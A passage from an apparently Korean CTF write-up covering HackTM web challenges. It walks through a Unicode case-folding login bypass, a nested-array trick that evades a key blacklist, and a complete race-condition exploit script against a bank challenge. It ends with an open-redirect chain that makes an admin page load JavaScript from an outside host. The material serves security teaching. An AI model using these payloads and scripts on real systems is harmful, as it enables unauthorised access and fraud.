(%48%331)</span><br><span class="line">[7831] ẗ (%E1%BA%97).toUpperCase() =&gt; T̈ (%54%308)</span><br><span class="line">[7832] ẘ (%E1%BA%98).toUpperCase() =&gt; W̊ (%57%30a)</span><br><span class="line">[7833] ẙ (%E1%BA%99).toUpperCase() =&gt; Y̊ (%59%30a)</span><br><span class="line">[7834] ẚ (%E1%BA%9A).toUpperCase() =&gt; Aʾ (%41%2be)</span><br><span class="line">[8490] K (%E2%84%AA).toLowerCase() =&gt; k (%6b)</span><br><span class="line">[64256] ﬀ (%EF%AC%80).toUpperCase() =&gt; FF (%46%46)</span><br><span class="line">[64257] ﬁ (%EF%AC%81).toUpperCase() =&gt; FI (%46%49)</span><br><span class="line">[64258] ﬂ (%EF%AC%82).toUpperCase() =&gt; FL (%46%4c)</span><br><span class="line">[64259] ﬃ (%EF%AC%83).toUpperCase() =&gt; FFI (%46%46%49)</span><br><span class="line">[64260] ﬄ (%EF%AC%84).toUpperCase() =&gt; FFL (%46%46%4c)</span><br><span class="line">[64261] ﬅ (%EF%AC%85).toUpperCase() =&gt; ST (%53%54)</span><br><span class="line">[64262] ﬆ (%EF%AC%86).toUpperCase() =&gt; ST (%53%54)</span><br></pre></td></tr></table></figure><p>자바스크립트에서 <code>K(U+212a)</code> 는 <code>String.toLowerCase</code> 함수를 통해, 아스키 문자인 <code>k(0x6b)</code> 로 변환됩니다. 따라서 <code>&#123;&quot;username&quot;:&quot;hac\u212aTm&quot;&#125;</code> 를 파라미터로 하여 로그인하면, <code>isValidUser</code> 함수를 우회하고 관리자 페이지인 <code>/updateUser</code> 에 접근할 수 있게 됩니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// Get the flag</span></span><br><span class="line">  <span class="comment">// Only for root</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">user</span>.<span class="property">id</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="title function_">ok</span>(&#123; <span class="attr">flag</span>: flag &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="title function_">err</span>(<span class="string">&quot;Unauthorized&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>플래그를 얻기 위해서는 <code>/flag</code> 경로에 접근할 수 있어야 하는데, <code>req.user.id</code> 값을 <code>0</code> 으로 만들어야 합니다. 이 값은 <code>/init</code> 페이지에서 변경할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/init&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123; p = <span class="string">&quot;0&quot;</span>, q = <span class="string">&quot;0&quot;</span>, clearPIN &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> target = <span class="title function_">md5</span>(config.<span class="property">n</span>.<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> pwHash = <span class="title function_">md5</span>(</span><br><span class="line">    <span class="title function_">bigInt</span>(<span class="title class_">String</span>(p))</span><br><span class="line">      .<span class="title function_">multiply</span>(<span class="title class_">String</span>(q))</span><br><span class="line">      .<span class="title function_">toString</span>()</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pwHash == target &amp;&amp; clearPIN === _clearPIN) &#123;</span><br><span class="line">    <span class="comment">// Clear the board</span></span><br><span class="line">    board = <span class="keyword">new</span> <span class="title class_">Array</span>(config.<span class="property">height</span>)</span><br><span class="line">      .<span class="title function_">fill</span>(<span class="number">0</span>)</span><br><span class="line">      .<span class="title function_">map</span>(<span class="function">() =&gt;</span> <span class="keyword">new</span> <span class="title class_">Array</span>(config.<span class="property">width</span>).<span class="title function_">fill</span>(config.<span class="property">backgroundColor</span>));</span><br><span class="line">    boardString = <span class="title function_">boardToStrings</span>();</span><br><span class="line"></span><br><span class="line">    io.<span class="title function_">emit</span>(<span class="string">&quot;board&quot;</span>, &#123; <span class="attr">board</span>: boardString &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Sign the admin ID</span></span><br><span class="line">  <span class="keyword">let</span> adminId = pwHash</span><br><span class="line">    .<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function">(<span class="params">c, i</span>) =&gt;</span> c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>) ^ target.<span class="title function_">charCodeAt</span>(i))</span><br><span class="line">    .<span class="title function_">reduce</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(adminId);</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(<span class="title function_">ok</span>(&#123; <span class="attr">token</span>: <span class="title function_">sign</span>(&#123; <span class="attr">id</span>: adminId &#125;) &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>/init</code> 에서는 <code>sign</code> 함수를 통해 <code>req.users.id</code> 값을 변경할 수 있습니다.<br> 그러기 위해서는 <code>pwHash</code> 값인 <code>md5(bigInt(String(p)).multiply(String(q)).toString())</code> 와 <code>target</code> 인 <code>md5(config.n.toString())</code> 값이 동일해야만 합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/serverInfo&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// Get server info</span></span><br><span class="line">  <span class="comment">// Only for logged in users</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> user = users[req.<span class="property">user</span>.<span class="property">id</span>] || &#123; <span class="attr">rights</span>: [] &#125;;</span><br><span class="line">  <span class="keyword">let</span> info = user.<span class="property">rights</span>.<span class="title function_">map</span>(<span class="function"><span class="params">i</span> =&gt;</span> (&#123; <span class="attr">name</span>: i, <span class="attr">value</span>: config[i] &#125;));</span><br><span class="line">  res.<span class="title function_">json</span>(<span class="title function_">ok</span>(&#123; <span class="attr">info</span>: info &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>config.n</code> 값은 <code>/serverInfo</code> 에서 알아낼 수 있습니다.<br> <code>user.rights.map</code> 함수를 통하여 config[n] 값을 반환하도록 할 수 있는 가능성을 제공합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/updateUser&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">let</span> rights = req.<span class="property">body</span>.<span class="property">rights</span> || [];</span><br><span class="line">  <span class="keyword">if</span> (rights.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; <span class="title function_">checkRights</span>(rights)) &#123;</span><br><span class="line">    users[uid].<span class="property">rights</span> = user.<span class="property">rights</span>.<span class="title function_">concat</span>(rights).<span class="title function_">filter</span>(onlyUnique);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkRights</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> blacklist = [<span class="string">&quot;p&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;port&quot;</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = arr[i];</span><br><span class="line">    <span class="keyword">if</span> (blacklist.<span class="title function_">includes</span>(element)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>따라서 위에서 설명했던 <code>/updateUser</code> 페이지를 통해 <code>user.rights</code> 에서 <code>n</code> 값을 넣어주면 되는데<br> <code>checkRights</code> 함수에서 <code>blacklist.includes</code> 를 통해 <code>p</code>, <code>n</code>, <code>post</code> 등의 문자열 값이 입력으로 들어올 경우 거부됩니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A = &#123;<span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;value&#x27;</span>&#125;</span><br><span class="line"><span class="comment">// &#123;key: &quot;value&quot;&#125;</span></span><br><span class="line">A[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line"><span class="comment">// &quot;value&quot;</span></span><br><span class="line">A[[<span class="string">&#x27;key&#x27;</span>]]</span><br><span class="line"><span class="comment">// &quot;value&quot;</span></span><br></pre></td></tr></table></figure><p>자바스크립트에서는 첨자를 사용하여 객체를 참조할 때, 키 값으로 문자열 이외의 값이 들어올 경우, 원시 타입으로 변환하여 키로 사용합니다.<br> 따라서 <code>checkRights</code> 함수에서 입력으로 <code>&#123;&quot;rights&quot;:[[&quot;n&quot;]]&#125;</code> 과 같은 배열을 넣어줄 경우에, <code>blacklist.includes</code> 를 우회하여  <code>/serverInfo</code> 애서 <code>config.n</code> 값을 확인하도록 할 수 있습니다.</p><p>이후 <code>/init</code> 에서 <code>q</code> 값을 <code>1</code>으로,  <code>p</code> 값으로 알아낸 <code>config.n</code> 값을 넣어주면 <code>req.user.id</code> 값을 0으로 만들 수 있고, <code>/flag</code> 에서 플래그를 확인할 수 있습니다.</p><h2 id="280pts-My-Bank"><a href="#280pts-My-Bank" class="headerlink" title="[280pts] My Bank"></a>[280pts] <a href="#my-bank">My Bank</a></h2><blockquote><p> Who’s got my money?<br>Please abstain from brute-forcing files.<br><a href="http://178.128.175.6:50090/">http://178.128.175.6:50090/</a><br>Author: nytr0gen </p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exploit.js</span></span><br><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">&#x27;request&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">solve</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">request</span>(<span class="string">&#x27;http://178.128.175.6:50090/register&#x27;</span>, <span class="function">(<span class="params">err, res, body</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> cookie = res.<span class="property">headers</span>[<span class="string">&#x27;set-cookie&#x27;</span>][<span class="number">0</span>].<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">let</span> token = <span class="regexp">/csrf_token.+value=&quot;([^&quot;]+)&quot;/</span>.<span class="title function_">exec</span>(body)[<span class="number">1</span>];</span><br><span class="line">        <span class="title function_">request</span>(<span class="string">&#x27;http://178.128.175.6:50090/register&#x27;</span>, &#123;</span><br><span class="line">            <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="string">&quot;headers&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: cookie,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;body&quot;</span>: <span class="string">&quot;csrf_token=&quot;</span> + token + <span class="string">&quot;&amp;username=posix&quot;</span></span><br><span class="line">        &#125;, <span class="function">(<span class="params">err, res, body</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> cookie = res.<span class="property">headers</span>[<span class="string">&#x27;set-cookie&#x27;</span>][<span class="number">0</span>].<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">            <span class="title function_">request</span>(<span class="string">&#x27;http://178.128.175.6:50090/&#x27;</span>, &#123;</span><br><span class="line">                <span class="string">&quot;headers&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;Cookie&quot;</span>: cookie</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,<span class="function">(<span class="params">err, res, body</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> token = <span class="regexp">/csrf_token.+value=&quot;([^&quot;]+)&quot;/</span>.<span class="title function_">exec</span>(body)[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">let</span> cookie = res.<span class="property">headers</span>[<span class="string">&#x27;set-cookie&#x27;</span>][<span class="number">0</span>].<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">let</span> queue = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; ++i) &#123;</span><br><span class="line">                    queue += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="title function_">request</span>(<span class="string">&#x27;http://178.128.175.6:50090/&#x27;</span>, &#123;</span><br><span class="line">                        <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;headers&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;Cookie&quot;</span>: cookie,</span><br><span class="line">                            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="string">&quot;body&quot;</span>: <span class="string">&quot;csrf_token=&quot;</span> + token + <span class="string">&quot;&amp;loan=100&quot;</span></span><br><span class="line">                    &#125;, <span class="function">(<span class="params">err, res, body</span>) =&gt;</span> &#123;</span><br><span class="line">                        queue -= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (queue === <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">let</span> cookie = res.<span class="property">headers</span>[<span class="string">&#x27;set-cookie&#x27;</span>][<span class="number">0</span>].<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">                            <span class="title function_">request</span>(<span class="string">&#x27;http://178.128.175.6:50090/&#x27;</span>, &#123;</span><br><span class="line">                                <span class="string">&quot;headers&quot;</span>: &#123;</span><br><span class="line">                                    <span class="string">&quot;Cookie&quot;</span>: cookie</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;, <span class="function">(<span class="params">err, res, body</span>) =&gt;</span> &#123;</span><br><span class="line">                                <span class="keyword">let</span> money = <span class="regexp">/Money: ([^ ]+)/</span>.<span class="title function_">exec</span>(body)[<span class="number">1</span>];</span><br><span class="line">                                money = <span class="built_in">parseInt</span>(money.<span class="title function_">replace</span>(<span class="regexp">/,/g</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> (money &gt;= <span class="number">1400</span>) &#123;</span><br><span class="line">                                    <span class="title function_">get_flag</span>(cookie);</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] Trying, Got &#x27;</span> + money);</span><br><span class="line">                                    <span class="title function_">solve</span>();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_flag</span>(<span class="params">cookie</span>) &#123;</span><br><span class="line">    <span class="title function_">request</span>(<span class="string">&#x27;http://178.128.175.6:50090/store&#x27;</span>, &#123;</span><br><span class="line">        <span class="string">&quot;headers&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: cookie</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="function">(<span class="params">err, res, body</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> token = <span class="regexp">/csrf_token.+value=&quot;([^&quot;]+)&quot;/</span>.<span class="title function_">exec</span>(body)[<span class="number">1</span>];</span><br><span class="line">        <span class="title function_">request</span>(<span class="string">&#x27;http://178.128.175.6:50090/store&#x27;</span>, &#123;</span><br><span class="line">            <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="string">&quot;headers&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: cookie,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;body&quot;</span>: <span class="string">&quot;csrf_token=&quot;</span> + token + <span class="string">&quot;&amp;item=1337&quot;</span></span><br><span class="line">        &#125;, <span class="function">(<span class="params">err, res, body</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> cookie = res.<span class="property">headers</span>[<span class="string">&#x27;set-cookie&#x27;</span>][<span class="number">0</span>].<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">            <span class="title function_">request</span>(<span class="string">&#x27;http://178.128.175.6:50090/store&#x27;</span>, &#123;</span><br><span class="line">                <span class="string">&quot;headers&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;Cookie&quot;</span>: cookie</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="function">(<span class="params">err, res, body</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> flag = <span class="regexp">/HackTM&#123;.*&#125;/</span>.<span class="title function_">exec</span>(body)[<span class="number">0</span>];</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[!] flag is &quot;</span> + flag);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">solve</span>();</span><br></pre></td></tr></table></figure><p>레이스 컨디션 취약점을 통해 <code>600.00 tBTC</code> 이상의 돈을 빌릴 수 있습니다.<br> 이후 <code>/store</code> 에서 플래그를 구입하면 됩니다.</p><h2 id="497pts-mIRC-3rd-solve"><a href="#497pts-mIRC-3rd-solve" class="headerlink" title="[497pts] mIRC (3rd solve)"></a>[497pts] <a href="#mirc">mIRC</a> (3rd solve)</h2><blockquote><p> The new Yahoo! Messenger. Dirbuster will not help you with anything. The admin should be talkative.<br><a href="http://178.128.175.6:40080/">http://178.128.175.6:40080/</a><br>Author: nytr0gen </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// http://178.128.175.6:40080/login?next=http://rwx.kr/1.js</span><br><span class="line">// if logged in, redirect to (http://rwx.kr/1.js)</span><br><span class="line"></span><br><span class="line">POST /register HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">csrf_token=&lt;token&gt;&amp;username=../../login?next=http://rwx.kr/1.js?x=?&amp;password=123</span><br></pre></td></tr></table></figure><p><code>http://178.128.175.6:40080/login?next=http://attacker.com</code> 의 <code>open redirection</code> 취약점이 존재하고 로그인 시, 유저명에 url 을 입력할 수 있습니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;chat-personalization&quot;</span> <span class="attr">data-chat_url</span>=<span class="string">&quot;/api/messages/&quot;</span> <span class="attr">data-param</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">data-start_qualifier</span>=<span class="string">&quot;__P&quot;</span> <span class="attr">data-end_qualifier</span>=<span class="string">&quot;P__&quot;</span> <span class="attr">data-source_path_empty</span>=<span class="string">&quot;&quot;</span> <span class="attr">data-disable_cache</span>=<span class="string">&quot;true&quot;</span> <span class="attr">data-css_selector</span>=<span class="string">&quot;.chatform_hidden&quot;</span> <span class="attr">data-last_update</span>=<span class="string">&quot;1580610880.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>/messages?username=admin</code> 에서 관리자와 대화할 수 있는 기능이 주어지는데<br> 페이지 중간에 위와 같은 태그가 존재합니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;chat-personalization&quot;</span> <span class="attr">data-chat_url</span>=<span class="string">&quot;/api/messages/&quot;</span> <span class="attr">data-param</span>=<span class="string">&quot;../../login?next=http://rwx.kr/1.js?x=?&quot;</span> <span class="attr">data-start_qualifier</span>=<span class="string">&quot;__P&quot;</span> <span class="attr">data-end_qualifier</span>=<span class="string">&quot;P__&quot;</span> <span class="attr">data-source_path_empty</span>=<span class="string">&quot;&quot;</span> <span class="attr">data-disable_cache</span>=<span class="string">&quot;true&quot;</span> <span class="attr">data-css_selector</span>=<span class="string">&quot;.chatform_hidden&quot;</span> <span class="attr">data-last_update</span>=<span class="string">&quot;1580610880.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>data-param</code> 부분에 대화하는 상대방의 유저명이 포함되며, 예를 들어 <code>../../login?next=http://rwx.kr/1.js?x=?</code> 이라는 이름으로 가입한 경우 위와 같은 상태가 됩니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkNewMessages</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> chat = $(<span class="string">&quot;#chat-personalization&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!chat.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> chat_url = chat.<span class="title function_">data</span>(<span class="string">&quot;chat_url&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> param = chat.<span class="title function_">data</span>(<span class="string">&quot;param&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> start_qualifier = chat.<span class="title function_">data</span>(<span class="string">&quot;start_qualifier&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> end_qualifier = chat.<span class="title function_">data</span>(<span class="string">&quot;end_qualifier&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> source_path_empty = chat.<span class="title function_">data</span>(<span class="string">&quot;source_path_empty&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> disable_cache = chat.<span class="title function_">data</span>(<span class="string">&quot;disable_cache&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> css_selector = chat.<span class="title function_">data</span>(<span class="string">&quot;css_selector&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> enable_decrypt = chat.<span class="title function_">data</span>(<span class="string">&quot;enable_decrypt&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> last_update = +chat.<span class="title function_">data</span>(<span class="string">&quot;last_update&quot;</span>) || <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!source_path_empty) &#123;</span><br><span class="line">      <span class="keyword">var</span> vid = param;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> vid != <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> f = (disable_cache) ? vid.<span class="title function_">toLowerCase</span>() : vid.<span class="title function_">toLowerCase</span>().<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">var</span> c = (disable_cache) ? &#123;</span><br><span class="line">          <span class="attr">_</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>()</span><br><span class="line">        &#125; : &#123;&#125;;</span><br><span class="line">        <span class="comment">// personalize with backend data</span></span><br><span class="line">        <span class="keyword">var</span> ajax = $.<span class="title function_">getJSON</span>(chat_url + f, c);</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span 